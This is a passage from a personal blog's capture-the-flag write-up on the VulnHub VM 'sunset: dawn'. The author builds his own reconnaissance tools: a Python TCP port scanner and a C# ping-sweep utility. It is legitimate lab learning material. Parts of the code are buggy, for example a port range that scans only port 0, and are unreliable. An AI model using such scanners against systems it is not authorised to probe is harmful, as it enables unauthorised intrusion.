<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=author content="map[name:spook]"><meta name=description content="intro / rules Welcome to the first of hopefully a series of blog posts. The goal of
this post is to explain the rules of the challenge I have created for
myself. The goal is to solve Boot2Root style VMs while writing as many
custom tools as possible. There are a few categories of tools that I
have semi arbitrarily declared safe for use during the challenge. These
tools include the following:"><meta name=keywords content="cybersecurity"><meta name=robots content="noodp"><meta name=theme-color content><link rel=canonical href=https://spookyscary1.github.io/posts/2022/05/dawn-writeup-but-with-slightly-more-programming/><title>Dawn writeup but with slightly more programming :: spook's blog â€” Hello Friend NG Theme</title><link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css><link rel=stylesheet href=https://spookyscary1.github.io/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css><link rel=apple-touch-icon sizes=180x180 href=https://spookyscary1.github.io/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=https://spookyscary1.github.io/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=https://spookyscary1.github.io/favicon-16x16.png><link rel=manifest href=https://spookyscary1.github.io/site.webmanifest><link rel=mask-icon href=https://spookyscary1.github.io/safari-pinned-tab.svg color><link rel="shortcut icon" href=https://spookyscary1.github.io/favicon.ico><meta name=msapplication-TileColor content><meta itemprop=name content="Dawn writeup but with slightly more programming"><meta itemprop=description content="intro / rules Welcome to the first of hopefully a series of blog posts. The goal of
this post is to explain the rules of the challenge I have created for
myself. The goal is to solve Boot2Root style VMs while writing as many
custom tools as possible. There are a few categories of tools that I
have semi arbitrarily declared safe for use during the challenge. These
tools include the following:"><meta itemprop=datePublished content="2022-05-15T00:00:00+00:00"><meta itemprop=dateModified content="2022-05-15T00:00:00+00:00"><meta itemprop=wordCount content="2793"><meta itemprop=image content="https://spookyscary1.github.io"><meta itemprop=keywords content><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://spookyscary1.github.io"><meta name=twitter:title content="Dawn writeup but with slightly more programming"><meta name=twitter:description content="intro / rules Welcome to the first of hopefully a series of blog posts. The goal of
this post is to explain the rules of the challenge I have created for
myself. The goal is to solve Boot2Root style VMs while writing as many
custom tools as possible. There are a few categories of tools that I
have semi arbitrarily declared safe for use during the challenge. These
tools include the following:"><meta property="og:title" content="Dawn writeup but with slightly more programming"><meta property="og:description" content="intro / rules Welcome to the first of hopefully a series of blog posts. The goal of
this post is to explain the rules of the challenge I have created for
myself. The goal is to solve Boot2Root style VMs while writing as many
custom tools as possible. There are a few categories of tools that I
have semi arbitrarily declared safe for use during the challenge. These
tools include the following:"><meta property="og:type" content="article"><meta property="og:url" content="https://spookyscary1.github.io/posts/2022/05/dawn-writeup-but-with-slightly-more-programming/"><meta property="og:image" content="https://spookyscary1.github.io"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-05-15T00:00:00+00:00"><meta property="article:modified_time" content="2022-05-15T00:00:00+00:00"><meta property="article:published_time" content="2022-05-15 00:00:00 +0000 UTC"></head><body><div class=container><header class=header><span class=header__inner><a href=https://spookyscary1.github.io/ style=text-decoration:none><div class=logo><span class=logo__mark>></span>
<span class=logo__text>$ cd /home/</span>
<span class=logo__cursor></span></div></a><span class=header__right><nav class=menu><ul class=menu__inner><li><a href=https://spookyscary1.github.io/about/>About</a></li><li><a href=https://spookyscary1.github.io/posts/>Posts</a></li><div class=submenu><li class=dropdown><a href=javascript:void(0) class=dropbtn>en</a><div class=dropdown-content></div></li></div></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span></span></span></header><div class=content><main class=post><div class=post-info><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>14 minutes</p></div><article><h1 class=post-title><a href=https://spookyscary1.github.io/posts/2022/05/dawn-writeup-but-with-slightly-more-programming/>Dawn writeup but with slightly more programming</a></h1><div class=post-content><h1 id=intro--rules>intro / rules</h1><p>Welcome to the first of hopefully a series of blog posts. The goal of<br>this post is to explain the rules of the challenge I have created for<br>myself. The goal is to solve Boot2Root style VMs while writing as many<br>custom tools as possible. There are a few categories of tools that I<br>have semi arbitrarily declared safe for use during the challenge. These<br>tools include the following:</p><ul><li>web browsers</li><li>burp suite</li><li>netcat</li><li>clients for protocols that are mildly inconvenient to program<br>myself(samba,sftp, etc)</li><li>hash identifier tools</li></ul><p>Ultimately the rules for what is and is not allowed are not all that
important. I think the spirit of the challenge is more important
overall, and I will likely, in the future, arbitrarily change the rules
as I decide what seems the most interesting.</p><p>TLDR: If it is installed by default on Kali Linux but not on Ubuntu, I
will try not to use it.</p><h1 id=enumeration>Enumeration</h1><p>In this post, I will attempt to gain root on the box <a href=https://www.vulnhub.com/entry/sunset-dawn,341/>sunset:<br>dawn</a> with a twist. I will write custom tools
to perform most actions needed to gain root on this machine instead of
relying on premade tools. A tentative set of rules for the challenge I
have created for myself is listed here.</p><p>After much thinking, I believe I need a port scanner. The real question is how little port scanner do I need. Features like banner grabbing and identifying operating systems seem unnecessary at the moment. I settle on writing a python script that attempts to connect to every TCP port on the machine and report which ports are open. This programming project
begins, like most, with googling. I concluded that the socket library
would serve my needs. Then the experimental phase began. This phase
involves me opening the python interpreter and experimenting with
random functions to see how they work.</p><p>I use the HTTP server module of python to start a web server on port 80
of my local machine.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo python -m http.server <span style=color:#ae81ff>80</span>
</span></span></code></pre></div><p>I use the Python interpreter to see how the connect_ex function handles open v.s., not open ports.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>&gt;&gt;&gt; import socket  
</span></span><span style=display:flex><span>&gt;&gt;&gt;    
</span></span><span style=display:flex><span>&gt;&gt;&gt; HOST <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;127.0.0.1&#34;</span>  
</span></span><span style=display:flex><span>&gt;&gt;&gt; port<span style=color:#f92672>=</span><span style=color:#ae81ff>80</span>  
</span></span><span style=display:flex><span>&gt;&gt;&gt; sock <span style=color:#f92672>=</span> socket.socket<span style=color:#f92672>(</span>socket.AF_INET, socket.SOCK_STREAM<span style=color:#f92672>)</span>  
</span></span><span style=display:flex><span>&gt;&gt;&gt; server_addr <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>host, port<span style=color:#f92672>)</span>  
</span></span><span style=display:flex><span>Traceback <span style=color:#f92672>(</span>most recent call last<span style=color:#f92672>)</span>:  
</span></span><span style=display:flex><span> File <span style=color:#e6db74>&#34;&lt;stdin&gt;&#34;</span>, line 1, in &lt;module&gt;  
</span></span><span style=display:flex><span>NameError: name <span style=color:#e6db74>&#39;host&#39;</span> is not defined  
</span></span><span style=display:flex><span>&gt;&gt;&gt; server_addr <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>HOST, port<span style=color:#f92672>)</span>         
</span></span><span style=display:flex><span>&gt;&gt;&gt; sock.connect_ex<span style=color:#f92672>(</span>server_addr<span style=color:#f92672>)</span>  
</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span>  
</span></span><span style=display:flex><span>&gt;&gt;&gt; server_addr <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>HOST, 90<span style=color:#f92672>)</span>       
</span></span><span style=display:flex><span>&gt;&gt;&gt; sock.connect_ex<span style=color:#f92672>(</span>server_addr<span style=color:#f92672>)</span>  
</span></span><span style=display:flex><span><span style=color:#ae81ff>106</span>  
</span></span><span style=display:flex><span>&gt;&gt;&gt;
</span></span></code></pre></div><p>I safely conclude that the connect_ex function returns 0 if a connection
can be made. It returns not 0 if a connection cannot be made. It seems
safe to say most of the work to create a port scanner is done. I only
need to loop over all the possible ports and hope it is not too slow.</p><p>This code is the current implementation I have:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> socket
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>HOST <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;127.0.0.1&#34;</span> <span style=color:#75715e># plz replace with host IP address</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sock <span style=color:#f92672>=</span> socket<span style=color:#f92672>.</span>socket(socket<span style=color:#f92672>.</span>AF_INET, socket<span style=color:#f92672>.</span>SOCK_STREAM)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># loops through all ports</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range (<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>65</span>,<span style=color:#ae81ff>536</span>):
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    port<span style=color:#f92672>=</span>i
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    server_addr <span style=color:#f92672>=</span> (HOST, port)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    port_status<span style=color:#f92672>=</span>sock<span style=color:#f92672>.</span>connect_ex(server_addr)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> port_status<span style=color:#f92672>==</span><span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;port &#34;</span><span style=color:#f92672>+</span> str(i)<span style=color:#f92672>+</span><span style=color:#e6db74>&#34; is open&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>: <span style=color:#75715e># very uneeded</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>pass</span>
</span></span></code></pre></div><p>It now occurs to me that I do not have the means to figure out the IP
address of the machine we're supposed to be hacking. I could check the
DHCP logs of the router, but that seems like cheating. It would be more interesting to make a tool to scan all the IP addresses in the current subnet and report which machines respond to ping requests.</p><p>I choose to write this tool in C# for no reason in particular. I have
not programmed in C# in a while, and it seemed like an interesting idea. I settle on this prototype code that pings one machine. I could write a bash script that would use this program to ping all the IP addresses in my subnet, but I would rather add the ability to scan multiple hosts in a range to the tool.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c# data-lang=c#><span style=display:flex><span>    <span style=color:#75715e>// C# program to illustrate the</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Command Line Arguments</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>using</span> System;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>using</span> System.Net.NetworkInformation;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>namespace</span> Ping_scan
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>scanner</span> {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> Main(<span style=color:#66d9ef>string</span>[] args)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(args.Length ==<span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    Ping aPing = <span style=color:#66d9ef>new</span> Ping();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    PingReply reply = aPing.Send(args[<span style=color:#ae81ff>0</span>], <span style=color:#ae81ff>1000</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(reply.Status==IPStatus.Success){
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    Console.WriteLine(<span style=color:#e6db74>$&#34;response from: {args[0]}&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    Console.WriteLine(<span style=color:#e6db74>&#34;Usage: ping_scan [ip adress]&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    } }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    }
</span></span></code></pre></div><p>Initially, I had some difficulties deciding what arguments the program should take. I wanted the program to take in an IP address and a netmask in CIDR notation. My desire to keep the program simple for now and C#'s lack of a binary data type(as far as I could tell in the 4 minutes I<br>spent googling) forced me to reconsider my original design. I settled
on taking a start and end IP address as the inputs to the program.</p><p>I wrote a simple IPaddress class for this program. The main use of the IPaddress class is to hide the messy details of both incrementing and comparing IP addresses in the main function of the program.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c# data-lang=c#><span style=display:flex><span>  
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>using</span> System;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>using</span> System.Net.NetworkInformation;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>using</span> System.Net;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>using</span> System.Linq;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>namespace</span> Ping_scan
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>scanner</span> {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> Main(<span style=color:#66d9ef>string</span>[] args)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(args.Length ==<span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Ping aPing = <span style=color:#66d9ef>new</span> Ping();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PingReply reply = aPing.Send(args[<span style=color:#ae81ff>0</span>], <span style=color:#ae81ff>1000</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(reply.Status==IPStatus.Success){
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Console.WriteLine(<span style=color:#e6db74>$&#34;response from: {args[0]}&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span>(args.Length ==<span style=color:#ae81ff>2</span>){
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>IPaddress StartIP= <span style=color:#66d9ef>new</span> IPaddress(args[<span style=color:#ae81ff>0</span>]);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>IPaddress EndIP= <span style=color:#66d9ef>new</span> IPaddress(args[<span style=color:#ae81ff>1</span>]);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>EndIP.increment();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span>(StartIP&lt;EndIP)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Ping aPing = <span style=color:#66d9ef>new</span> Ping();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PingReply reply = aPing.Send(StartIP.ToString(), <span style=color:#ae81ff>1000</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(reply.Status==IPStatus.Success){
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Console.WriteLine(<span style=color:#e6db74>$&#34;response from: {StartIP}&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>StartIP.increment();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Console.WriteLine(<span style=color:#e6db74>&#34;Usage: ping_scan [ first ip address] [last IP address]&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>} }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// We&#39;re not going to check to make sure the value is a valid IP address.</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>IPaddress</span>{
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>int</span>[] intOctet= <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>int</span>[<span style=color:#ae81ff>4</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// constuctor to split the string by .&#39;s and store the integrer version of stuff into array</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> IPaddress(<span style=color:#66d9ef>string</span> anAddress){
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>string</span>[] octets = anAddress.Split(<span style=color:#e6db74>&#39;.&#39;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>bool</span> res;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span>(<span style=color:#66d9ef>int</span> i=<span style=color:#ae81ff>0</span>;i &lt;<span style=color:#ae81ff>4</span>;i++){
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>res=<span style=color:#66d9ef>int</span>.TryParse(octets[i], <span style=color:#66d9ef>out</span> intOctet[i]);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (!res)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> Exception(<span style=color:#e6db74>&#34;Not an integer&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// increment function it tries to increment each octet unless its value is 255</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// in that case the next octet is incremented and the previous octets are set to zero</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> increment(){
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(intOctet[<span style=color:#ae81ff>3</span>]!=<span style=color:#ae81ff>255</span>){
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>intOctet[<span style=color:#ae81ff>3</span>]++;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span>(intOctet[<span style=color:#ae81ff>2</span>]!= <span style=color:#ae81ff>255</span>){
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>intOctet[<span style=color:#ae81ff>2</span>]++;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>intOctet[<span style=color:#ae81ff>3</span>]=<span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span>(intOctet[<span style=color:#ae81ff>1</span>]!= <span style=color:#ae81ff>255</span>){
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>intOctet[<span style=color:#ae81ff>1</span>]++;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>intOctet[<span style=color:#ae81ff>3</span>]=<span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>intOctet[<span style=color:#ae81ff>2</span>]=<span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span>(intOctet[<span style=color:#ae81ff>0</span>]!= <span style=color:#ae81ff>255</span>){
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>intOctet[<span style=color:#ae81ff>0</span>]++;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>intOctet[<span style=color:#ae81ff>3</span>]=<span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>intOctet[<span style=color:#ae81ff>2</span>]=<span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>intOctet[<span style=color:#ae81ff>1</span>]=<span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// just returns Ip in dotted decimal notation</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>override</span> <span style=color:#66d9ef>string</span> ToString(){
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>return</span> intOctet[<span style=color:#ae81ff>0</span>].ToString()+<span style=color:#e6db74>&#34;.&#34;</span>+ intOctet[<span style=color:#ae81ff>1</span>].ToString()+<span style=color:#e6db74>&#34;.&#34;</span>+intOctet[<span style=color:#ae81ff>2</span>].ToString()+<span style=color:#e6db74>&#34;.&#34;</span>+intOctet[<span style=color:#ae81ff>3</span>].ToString();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// return Str(intOctet[0])+Str(intOctet[1])+Str(intOctet[2])+Str(intOctet[3]);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>bool</span> Equals(IPaddress anIP){
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(anIP.ToString()==<span style=color:#66d9ef>this</span>.ToString()){
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// Overload the &lt; and &gt; operator</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>bool</span> <span style=color:#66d9ef>operator</span> &lt; (IPaddress Ip1,IPaddress Ip2){
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(Ip1.intOctet[<span style=color:#ae81ff>0</span>]&lt;Ip2.intOctet[<span style=color:#ae81ff>0</span>]){
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (Ip1.intOctet[<span style=color:#ae81ff>1</span>]&lt;Ip2.intOctet[<span style=color:#ae81ff>1</span>]){
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (Ip1.intOctet[<span style=color:#ae81ff>2</span>]&lt;Ip2.intOctet[<span style=color:#ae81ff>2</span>]){
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (Ip1.intOctet[<span style=color:#ae81ff>3</span>]&lt;Ip2.intOctet[<span style=color:#ae81ff>3</span>]){
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// Console.WriteLine(Ip1);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// Console.WriteLine(Ip2);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>bool</span> <span style=color:#66d9ef>operator</span> &gt; (IPaddress Ip1,IPaddress Ip2){
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(Ip1.intOctet[<span style=color:#ae81ff>0</span>]&lt;=Ip2.intOctet[<span style=color:#ae81ff>0</span>]){
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (Ip1.intOctet[<span style=color:#ae81ff>1</span>]&lt;=Ip2.intOctet[<span style=color:#ae81ff>1</span>]){
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (Ip1.intOctet[<span style=color:#ae81ff>2</span>]&lt;=Ip2.intOctet[<span style=color:#ae81ff>2</span>]){
